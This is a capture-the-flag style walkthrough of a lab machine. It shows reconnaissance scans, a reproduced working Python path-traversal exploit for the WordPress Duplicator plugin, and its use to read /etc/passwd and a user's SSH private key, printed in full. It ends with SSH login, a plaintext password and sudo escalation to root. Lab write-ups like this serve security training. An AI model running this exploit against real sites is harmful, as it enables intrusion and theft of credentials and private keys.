url=192.168.1.205

`nmap -p- $url -T4`

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 15:00 CEST
Nmap scan report for 192.168.1.205
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 83.42 seconds
```

## Feroxbuster

`feroxbuster -u http://$url:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -A --burp-replay --replay-codes 200,300,301`

```txt
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.1.205:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🎥  Replay Proxy          │ http://127.0.0.1:8080
 📼  Replay Proxy Codes    │ [200, 300, 301]
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://192.168.1.205/icons/ubuntu-logo.png
200      GET      392l      976w    12646c http://192.168.1.205/
301      GET        9l       28w      315c http://192.168.1.205/S3cr3t => http://192.168.1.205/S3cr3t/
301      GET        9l       28w      326c http://192.168.1.205/S3cr3t/wp-content => http://192.168.1.205/S3cr3t/wp-content/
301      GET        9l       28w      334c http://192.168.1.205/S3cr3t/wp-content/uploads => http://192.168.1.205/S3cr3t/wp-content/uploads/
301      GET        9l       28w      327c http://192.168.1.205/S3cr3t/wp-includes => http://192.168.1.205/S3cr3t/wp-includes/
301      GET        9l       28w      334c http://192.168.1.205/S3cr3t/wp-content/plugins => http://192.168.1.205/S3cr3t/wp-content/plugins/
200      GET        0l        0w        0c http://192.168.1.205/S3cr3t/wp-includes/class-wp-comment.php
500      GET        0l        0w        0c http://192.168.1.205/S3cr3t/wp-includes/class-wp-scripts.php
200      GET        0l        0w        0c http://192.168.1.205/S3cr3t/wp-includes/class-wp-recovery-mode-email-service.php
200      GET        0l        0w        0c http://192.168.1.205/S3cr3t/wp-includes/class-wp-matchesmapregex.php
200      GET        0l        0w        0c http://192.168.1.205/S3cr3t/wp-includes/class-wp-term-query.php
200      GET        0l        0w        0c http://192.168.1.205/S3cr3t/wp-includes/class-wp-theme-json-schema.php
500      GET        0l        0w        0c http://192.168.1.205/S3cr3t/wp-includes/class-wp-customize-setting.php
200      GET        0l        0w        0c http://192.168.1.205/S3cr3t/wp-includes/class-wp-recovery-mode-cookie-service.php
```

## wpscan
`wpscan --plugins-detection aggressive --url http://$url/S3cr3t`

```txt
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.1.205/S3cr3t/wp-content/plugins/akismet/
 | Last Updated: 2025-05-07T16:30:00.000Z
 | Readme: http://192.168.1.205/S3cr3t/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.4
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.205/S3cr3t/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.2.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.1.205/S3cr3t/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.1.205/S3cr3t/wp-content/plugins/akismet/readme.txt

[+] duplicator
 | Location: http://192.168.1.205/S3cr3t/wp-content/plugins/duplicator/
 | Last Updated: 2025-03-11T14:31:00.000Z
 | Readme: http://192.168.1.205/S3cr3t/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.12
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.1.205/S3cr3t/wp-content/plugins/duplicator/, status: 200
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.1.205/S3cr3t/wp-content/plugins/duplicator/readme.txt
```


https://www.exploit-db.com/exploits/50420

```python
import requests as re
import sys

if len(sys.argv) != 3:
        print("Exploit made by nam3lum.")
        print("Usage: CVE-2020-11738.py http://192.168.1.205 /etc/passwd")
        exit()

arg = sys.argv[1]
file = sys.argv[2]

URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file

output = re.get(url = URL)
print(output.text)
```

Can read /et/passwd
`python exploit.py http://192.168.1.205/S3cr3t /etc/passwd`

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
alpha:x:1000:1000:alpha,,,:/home/alpha:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:122:129:MySQL Server,,,:/nonexistent:/bin/false
```

`python exploit.py http://192.168.1.205/S3cr3t /home/alpha/.ssh/id_rsa`

```ssh
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAo6j9+EYe0zmsl6Pl9bpD+MAXkx6mhEtokUBmeeCld6wtr5V6
beJMl+gNhEEpHiUFaDlAPlEMMIgsTSp0PEzHlipw/ancS7Eieov2bcpRf5jjBVry
FpgY2k5V6YsQp575+WWINC/b1ilX1QKk9P2K2iwpWddua2bjOYhvZCApPBYB7aPX
zOLSPsTTdRP1YDfxJmK68upACnAl2w/XV6WN3gRMb4qp2jsa0nf2M2N+ExI/fuqH
+qATzqD08V73UBLUFDJ1ywSxnxdd4ZFlRqPFK/NL9FClI3Z+MAHp7hSO/8wiRegb
/8saqDdLL9w4jpmYsusorazATr1NZROZZXZ9SwIDAQABAoIBAQCIQM+AfdB4BpI8
hUWUuQiR9ksqPuBfT/C0zSsD2RWpdn1qq0YMadVeuuFV9HHpGOVRiiiEOTGuzhAk
Bm5TLZEU4izD40D2+3g7En+NlF0ZoA2Rjc/zI5m9Vm6MSy0IgICZNACbgiTCPhVT
0CnJlbSeQxoCJCtX24bdhUtHzsbFsC/6IvTDJQUTkNHtSfwqXCrikad6NaZe7Lme
UkbB4VNlEs30BGn0BT5MI1BOO11fKiQE9wXBSGe18Y70X6DJvxNP7lVxne6WmfuS
WK7yVm4UMBVQcfcmdg3ojyEkmSLlMhq60d2h+G+wktER0pXz81I+k+pIpsFxJKDd
eOQJcPuhAoGBAM+2d39zbKAFfZHBLZblvM6K6Shr16hal51/FLvO6njx6QHy3hc5
1mxigOYyL0/DFH+0lGI79naAD+MbJS6+9WS1Y24BUEnzUlrx4eta4W37EbaHbDM8
stORO5xPz/bMmGlC6SBmRMn3Zrlkr36LBpm7N7KBA3ZqkD+AvEHFbC5TAoGBAMm0
1kNbfVh6lLG+uq44dHK0Q7C05d3UCLm0Mtx0kIeNnFBNFkgZI3/4ugmWmu0cd4lG
SrlVAmZHTpmQkR9jjqLwaOP18WYZ86OMVnbza1T0ZtYWN6c1esMItoyVvwJDhnNo
VqdaP86ISJvoCnxxtytwH3JTDhRuoklKg2ue2mYpAoGAO4IzSjhvbokkKJYH0auQ
JDx4ADSlXH5X4a9+6S+mzW/BKeXC6zSO0g6Gj2zhUSC6xrudp2c2fUzDQHWOeY4M
EAZHrkSCFC258oRKDXvEChZcRMcXoLZLJYH+ahITqsmDAOVClR23p4VR0Nufy8lY
4sJYerOrokl1ejwPs2g0TjECgYAehaPKi4SbJ+lqQB9Fj7tnRAneKnGCMLylRTRR
Eb5xFKerqw6NGGi7y6pzGvwUlzMrbZyPEOMNEQs+x5Z+NnV2CIUGwcemmJS6kdjf
pRP/xf/ts2z2e2w5KQ9elKZTtF4bBpXeOxTerta16NX1YMvD4fKQPSsrQlaCWqkq
Vt5biQKBgBtuNVJFvv63ViNLS3LXBEzkrstbd0b5YRdDhJh0y1g1Nr2lL4CEtZWZ
iJ4s+QB3LQfRbKmtbaci5kHaJ8t7tKJkdykqViM/GkFa8u2Z535ejNDPNRSsn+ke
Sl1JIJpL5oTX53EBBy9AIjZHNrKOA5PuMZytMgehDa52aYVtgXvu
-----END RSA PRIVATE KEY-----
```

```sh
chmod 600 id_rsa
ssh -i id_rsa alpha@192.168.1.205
```

# User
PT{36410a46dc9f9276059276a6cf1770e6}


User password in Documents/notes.txt: Alpha_P@ssw0rd!


sudo su

# root
PT{8fe319e44ac65d8e5522bfcca1a8c006}